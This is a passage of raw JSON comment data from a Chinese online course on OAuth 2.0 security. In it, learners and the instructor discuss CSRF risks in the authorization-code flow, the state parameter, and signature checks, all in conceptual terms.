delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]},{"author":{"id":1275424,"avatar":"https://thirdwx.qlogo.cn/mmopen/vi_32/aiaO77mTsCalcia49ElevPn988pgwcL3rD5ic1DTD6E8rbAwfmguiaPsibHicsYGQID7VbmD21GUAV9bbuNMfDhDGGyg/132","nickname":"穿针土豆丝","note":"","ucode":"5DA3BDDE5162E4","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":375331,"discussion_content":"同样有这个疑问","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1621580794,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":252944,"user_name":"JianXu","can_delete":false,"product_type":"c1","uid":1033219,"ip_address":"","ucode":"2A61BDBB573BDC","user_header":"https://static001.geekbang.org/account/avatar/00/0f/c4/03/f753fda7.jpg","comment_is_top":false,"comment_ctime":1602541500,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"10192476092","product_id":100053901,"comment_content":"“在https:&#47;&#47;time.geekbang.org&#47;page&#47;下，创建了一个页面 hacker.html。” — 老师，黑客是怎么才能在这里新创建一个自己的页面呢？","like_count":2},{"had_liked":false,"id":248789,"user_name":"曙光","can_delete":false,"product_type":"c1","uid":1476450,"ip_address":"","ucode":"04D65BF7F19845","user_header":"https://static001.geekbang.org/account/avatar/00/16/87/62/f99b5b05.jpg","comment_is_top":false,"comment_ctime":1600311269,"is_pvip":false,"discussion_count":2,"race_medal":0,"score":"5895278565","product_id":100053901,"comment_content":"“如果这个时候用户 G 被攻击者软件 A 诱导而点击了这个恶意页面，那结果就是，极客时间使用 codeA 值去继续 OAuth 2.0 的流程了。” 第三讲中有说，code会和用户以及appid做关联，如果codeA关联的是用户A，那用户G点击回调函数，也只能获取用户A的access_Token吧。如果传输了G用户的相关信息，授权服务应该拒绝。 所以CSRF攻击有一些前提，如授权服务没有校验codeA是属于哪个用户的code","like_count":1,"discussions":[{"author":{"id":1993603,"avatar":"https://static001.geekbang.org/account/avatar/00/1e/6b/83/5fb44cd0.jpg","nickname":"Jagger Chen","note":"","ucode":"7C6ACBCF32ED12","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":373261,"discussion_content":"我也困惑这个点，code + userId + appId 就可以避免了吧","likes_number":1,"is_delete":false,"is_hidden":false,"ctime":1620662041,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]},{"author":{"id":2417697,"avatar":"https://static001.geekbang.org/account/avatar/00/24/e4/21/7765ee4b.jpg","nickname":"c","note":"","ucode":"830F21555F6B2A","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":541762,"discussion_content":"但是App后端服务器用authcode发起请求的时候没办法携带授权平台的用户登录信息吧？所以应该没法验证UserID？AppID是可以验证的，但攻击的Code可以同一个App的另一个用户去请求生成","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1640550146,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":357926,"user_name":"赵小骄","can_delete":false,"product_type":"c1","uid":1801849,"ip_address":"广东","ucode":"9ADDBA44C22FDA","user_header":"https://static001.geekbang.org/account/avatar/00/1b/7e/79/fe67256e.jpg","comment_is_top":false,"comment_ctime":1663751431,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1663751431","product_id":100053901,"comment_content":"这个CSRF攻击的讲解不清楚，可以用之前的京东订单的例子讲好了","like_count":0},{"had_liked":false,"id":282514,"user_name":"Jason180915","can_delete":false,"product_type":"c1","uid":2425528,"ip_address":"","ucode":"44FC6729FBDDCA","user_header":"https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTK40RCxCdCaKfDiaz9Ia8g4nNyUM8wJxAGfm9ZmG5wSMQeuhgqjibGzaibBkYcGxDV8vpxhvoFcF1vyw/132","comment_is_top":false,"comment_ctime":1615287790,"is_pvip":false,"discussion_count":1,"race_medal":0,"score":"1615287790","product_id":100053901,"comment_content":"csrf里面。如果appid和授权码有绑定关系。也可以避免这个漏洞吧。用攻击者的授权码a+被攻击者的appid b 去获取token。检验绑定绑定关系就可以判断出来。","like_count":0,"discussions":[{"author":{"id":2906824,"avatar":"","nickname":"Geek_d09cb6","note":"","ucode":"46EE3C9E571E26","race_medal":0,"user_type":1,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":578499,"discussion_content":"对于微信来说，都是极客时间，appid是相同的，如果是用pkce不会有这个问题，你的浏览器不会有验证字符串","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1656837646,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":272274,"user_name":"涂诗棉","can_delete":false,"product_type":"c1","uid":2001533,"ip_address":"","ucode":"6FFF2E2BBF95E8","user_header":"http://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTI8sG1WWiaN5gehJ5w7IIJ6HibkPhgQsUnajY5yvPU9zf4em3jNTrybVUFNv3FsOudaUpYVZApmibTiaQ/132","comment_is_top":false,"comment_ctime":1610012905,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1610012905","product_id":100053901,"comment_content":"水平权限有个问题：接口提供者如果是第三方平台（有自己的用户系统），这时候如何打通三方用户关系","like_count":0},{"had_liked":false,"id":254040,"user_name":"JianXu","can_delete":false,"product_type":"c1","uid":1033219,"ip_address":"","ucode":"2A61BDBB573BDC","user_header":"https://static001.geekbang.org/account/avatar/00/0f/c4/03/f753fda7.jpg","comment_is_top":false,"comment_ctime":1603026608,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1603026608","product_id":100053901,"comment_content":"https:&#47;&#47;wooyun.x10sec.org&#47;static&#47;bugs&#47;wooyun-2013-017306.html <br>老师，<br>1. 当应用拿到 Access Token以后为什么要上传到“啪啪”的服务后端去换取认证字符串呢？按照标准OAuth 那样拿着Access Token 来做后续访问不可以吗？<br>2. 文章中提到修复建议一：“手机客户端有关认证交换的主体部分，一定要有一个服务器把关，这是最基础的。“， 能具体说说什么样的服务器把关吗？<br>3. 文章中提到的修复建议二：“手机服务器端在接收手机客户端的access token来对换取自家服务的认证凭据时，必须对access token进行来源查询、证明或签名校验。” ， 具体怎么做校验呢？","like_count":0},{"had_liked":false,"id":252938,"user_name":"JianXu","can_delete":false,"product_type":"c1","uid":1033219,"ip_address":"","ucode":"2A61BDBB573BDC","user_header":"https://static001.geekbang.org/account/avatar/00/0f/c4/03/f753fda7.jpg","comment_is_top":false,"comment_ctime":1602519948,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1602519948","product_id":100053901,"comment_content":"CSRF 中为什么一定要G 现在极客时间有登陆状态呢？而且要G 先登陆过极客时间，还要能让用户点击黑客的网站，这样好像太难了。","like_count":0},{"had_liked":false,"id":249950,"user_name":"JianXu","can_delete":false,"product_type":"c1","uid":1033219,"ip_address":"","ucode":"2A61BDBB573BDC","user_header":"https://static001.geekbang.org/account/avatar/00/0f/c4/03/f753fda7.jpg","comment_is_top":false,"comment_ctime":1600862583,"is_pvip":false,"discussion_count":2,"race_medal":0,"score":"1600862583","product_id":100053901,"comment_content":"“只要我们在授权服务验证第三方软件的请求时做了签名校验，那么攻击者在只拿到授权码 code 的情况下，仍然无法获取访问令牌，因为第三方软件只有通过访问令牌才能够访问用户的数据。” — 老师，你这里说的 签名校验具体是谁的签名，放在哪里，怎么校验呢？","like_count":0,"discussions":[{"author":{"id":1616954,"avatar":"http://thirdwx.qlogo.cn/mmopen/vi_32/ODqoBdTKsL1jW4m72BZ0ibECEtWPq0N1tAIlbzjsq6mcJiavT2CKtx0ejpIqQdHbRXdMWH0I1jpI2ZiawFIkF1icsQ/132","nickname":"白中白","note":"","ucode":"95F9DABEBEFAAA","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":310293,"discussion_content":"第三方请求授权服务器一般都要做签名，比如调用微信支付接口，需要对请求的参数做签名。授权服务器接收到请求后，会验证一遍，以确认请求参数是否被篡改","likes_number":1,"is_delete":false,"is_hidden":false,"ctime":1601735029,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]},{"author":{"id":2166878,"avatar":"https://static001.geekbang.org/account/avatar/00/21/10/5e/42f4faf7.jpg","nickname":"天择","note":"","ucode":"ED2B08DB2F2B38","race_medal":1,"user_type":1,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":405136,"discussion_content":"接上面回复，有些东西是第三方软件注册到授权服务时就确定的，比如client id，redirect URI等，这些东西可以通过签名来作校验。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1634521833,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":238670,"user_name":"kylexy_0817","can_delete":false,"product_type":"c1","uid":1068372,"ip_address":"","ucode":"392DD9DD5E4B6E","user_header":"https://static001.geekbang.org/account/avatar/00/10/4d/54/9c214885.jpg","comment_is_top":false,"comment_ctime":1596254790,"is_pvip":false,"replies":[{"id":"88267","content":"回调地址是一个固定的值，state在每次OAuth事务中是不一样的值，随机生成的值。","user_name":"作者回复","user_name_real":"王新栋","uid":"1352303","ctime":1596415767,"ip_address":"","comment_id":238670,"utype":1}],"discussion_count":1,"race_medal":0,"score":"1596254790","product_id":100053901,"comment_content":"王老师好，目前的开放平台接入服务，基本都要求在其管理后台配置回调地址吧？这样只要指定回调地址，用回调地址来校验，感觉不需要state参数也能避免CSRF攻击了吧？","like_count":0,"discussions":[{"author":{"id":1352303,"avatar":"https://static001.geekbang.org/account/avatar/00/14/a2/6f/d239ed80.jpg","nickname":"王新栋","note":"","ucode":"0A5D089B8E1E9D","race_medal":0,"user_type":2,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":502822,"discussion_content":"回调地址是一个固定的值，state在每次OAuth事务中是不一样的值，随机生成的值。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1596415767,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":237467,"user_name":"HeRui","can_delete":false,"product_type":"c1","uid":1395092,"ip_address":"","ucode":"4B736D2FD8FB54","user_header":"https://static001.geekbang.org/account/avatar/00/15/49/94/55e70da0.jpg","comment_is_top":false,"comment_ctime":1595838746,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1595838746","product_id":100053901,"comment_content":"状态码那个不清楚，攻击脚本在用攻击者自己的授权码发给后端服务换取access_token不知道与授权码有什么关系","like_count":0},{"had_liked":false,"id":235664,"user_name":"Invincible(･ิϖ･ิ)っ","can_delete":false,"product_type":"c1","uid":1465512,"ip_address":"","ucode":"E1CB4D9113C337","user_header":"https://static001.geekbang.org/account/avatar/00/16/5c/a8/0fc3dce5.jpg","comment_is_top":false,"comment_ctime":1595142237,"is_pvip":false,"replies":[{"id":"87039","content":"是一种形象的比喻，实际上是指攻击者截获了授权码这个行为。","user_name":"作者回复","user_name_real":"王新栋","uid":"1352303","ctime":1595149990,"ip_address":"","comment_id":235664,"utype":1}],"discussion_count":4,"race_medal":0,"score":"1595142237","product_id":100053901,"comment_content":"对于CSRF攻击有一个疑问：”有一个软件 A，我们让它来扮演攻击者，让它的开发者按照正常的流程使用极客时间。当该攻击者授权后，拿到授权码的值 codeA 之后，“立即按下了暂停键”，不继续往下走了。“ 这里授权码应该是返回到极客时间网站指定的的回调地址上了，攻击者是怎么控制流程不往下走的？ ","like_count":0,"discussions":[{"author":{"id":1352303,"avatar":"https://static001.geekbang.org/account/avatar/00/14/a2/6f/d239ed80.jpg","nickname":"王新栋","note":"","ucode":"0A5D089B8E1E9D","race_medal":0,"user_type":2,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":501799,"discussion_content":"是一种形象的比喻，实际上是指攻击者截获了授权码这个行为。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1595149990,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]},{"author":{"id":1465512,"avatar":"https://static001.geekbang.org/account/avatar/00/16/5c/a8/0fc3dce5.jpg","nickname":"Invincible(･ิϖ･ิ)っ","note":"","ucode":"E1CB4D9113C337","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":295036,"discussion_content":"state是和授权码一起返回的，攻击者截获了授权码，那是不是说state也截获了","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1596073500,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":2,"child_discussions":[{"author":{"id":1261959,"avatar":"https://static001.geekbang.org/account/avatar/00/13/41/87/46d7e1c2.jpg","nickname":"Better me","note":"","ucode":"CADF08D357489A","race_medal":0,"user_type":1,"is_pvip":true},"reply_author":{"id":1465512,"avatar":"https://static001.geekbang.org/account/avatar/00/16/5c/a8/0fc3dce5.jpg","nickname":"Invincible(･ิϖ･ิ)っ","note":"","ucode":"E1CB4D9113C337","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":300021,"discussion_content":"这里state是攻击者自己的，不能拿到受攻击用户的state","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1597913442,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":295036,"ip_address":""},"score":300021,"extra":""},{"author":{"id":1184637,"avatar":"https://static001.geekbang.org/account/avatar/00/12/13/7d/1454db9c.jpg","nickname":"KeepGoing","note":"","ucode":"B872F794265709","race_medal":0,"user_type":1,"is_pvip":true},"reply_author":{"id":1261959,"avatar":"https://static001.geekbang.org/account/avatar/00/13/41/87/46d7e1c2.jpg","nickname":"Better me","note":"","ucode":"CADF08D357489A","race_medal":0,"user_type":1,"is_pvip":true},"discussion":{"id":383284,"discussion_content":"没明白没什么不能拿到？","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1626023573,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":300021,"ip_address":""},"score":383284,"extra":""}]}]},{"had_liked":false,"id":234993,"user_name":"霹雳大仙pp","can_delete":false,"product_type":"c1","uid":1046893,"ip_address":"","ucode":"F654FD9AEC1D56","user_header":"https://static001.geekbang.org/account/avatar/00/0f/f9/6d/b623562a.jpg","comment_is_top":false,"comment_ctime":1594864414,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1594864414","product_id":100053901,"comment_content":"极客时间A盗用极客时间B的授权码，绕过appid和authorization_code绑定关系检查。可以通过state参数来避免","like_count":0},{"had_liked":false,"id":234988,"user_name":"林光铣","can_delete":false,"product_type":"c1","uid":2051337,"ip_address":"","ucode":"77F5960C4EC33C","user_header":"https://static001.geekbang.org/account/avatar/00/1f/4d/09/da292a37.jpg","comment_is_top":false,"comment_ctime":1594863817,"is_pvip":true,"replies":[{"id":"86734","content":"动态注册的初衷解决的是有多个【外部】的API提供商的时候，不用客户端去分别多次到这样的提供商来进行事先注册，不然没对接一个就要注册一次。如果API提供方都是自己公司的其实把硬件设备和后台服务作为一个更合适，通设备号来区别每一个这样的硬件设备。","user_name":"作者回复","user_name_real":"王新栋","uid":"1352303","ctime":1594875489,"ip_address":"","comment_id":234988,"utype":1}],"discussion_count":1,"race_medal":0,"score":"1594863817","product_id":100053901,"comment_content":"老师你好，如果要将一批硬件接入OAuth2.0系统，每个硬件作为一个动态客户端注册合适呢，还是硬件配套的后台服务作为一个客户端合适？<br><br>","like_count":0,"discussions":[{"author":{"id":1352303,"avatar":"https://static001.geekbang.org/account/avatar/00/14/a2/6f/d239ed80.jpg","nickname":"王新栋","note":"","ucode":"0A5D089B8E1E9D","race_medal":0,"user_type":2,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":501570,"discussion_content":"动态注册的初衷解决的是有多个【外部】的API提供商的时候，不用客户端去分别多次到这样的提供商来进行事先注册，不然没对接一个就要注册一次。如果API提供方都是自己公司的其实把硬件设备和后台服务作为一个更合适，通设备号来区别每一个这样的硬件设备。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1594875489,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":234961,"user_name":"tt","can_delete":false,"product_type":"c1","uid":1489957,"ip_address":"","ucode":"7753B79AD5A9AC","user_header":"https://static001.geekbang.org/account/avatar/00/16/bc/25/1c92a90c.jpg","comment_is_top":false,"comment_ctime":1594859986,"is_pvip":false,"replies":[{"id":"86718","content":"是的，我们讲的用户身份认证是指的最终用户的身份，也就是用户G或者小明。OAuth2.0首先呢确实并不能称为一个身份认证协议，它是一个授权协议，利用appid和app_secret只是验证了第三方软件的合法性，合法之后获取访问令牌以便代表小明去访问数据，代表的前提是小明对其进行了授权。<br><br>在09我们会讲到在OAuth 2.0 的基础上，我们增加ID_TOKEN可以实现用户身份认证。","user_name":"作者回复","user_name_real":"王新栋","uid":"1352303","ctime":1594860881,"ip_address":"","comment_id":234961,"utype":1}],"discussion_count":1,"race_medal":0,"score":"1594859986","product_id":100053901,"comment_content":"CSRF的本质是身份失窃，被恶意软件或者代码使用。下图中，恶意软件A正是通过将CODE_A和软件B的身份appid_b结合在一起。从而窃取了B的身份，进行了恶意操作。<br><br>老师在课中提到，不能将OAuth2.0用于身份认证，在XSRF场景下具体指的是哪一步？因为OAuth2.0不就是利用appid和app_secret对三方软件的身份做认证的么？<br>或者这里指的是用户G的身份？","like_count":0,"discussions":[{"author":{"id":1352303,"avatar":"https://static001.geekbang.org/account/avatar/00/14/a2/6f/d239ed80.jpg","nickname":"王新栋","note":"","ucode":"0A5D089B8E1E9D","race_medal":0,"user_type":2,"is_pvip":true},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":501561,"discussion_content":"是的，我们讲的用户身份认证是指的最终用户的身份，也就是用户G或者小明。OAuth2.0首先呢确实并不能称为一个身份认证协议，它是一个授权协议，利用appid和app_secret只是验证了第三方软件的合法性，合法之后获取访问令牌以便代表小明去访问数据，代表的前提是小明对其进行了授权。\n\n在09我们会讲到在OAuth 2.0 的基础上，我们增加ID_TOKEN可以实现用户身份认证。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1594860881,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]}]}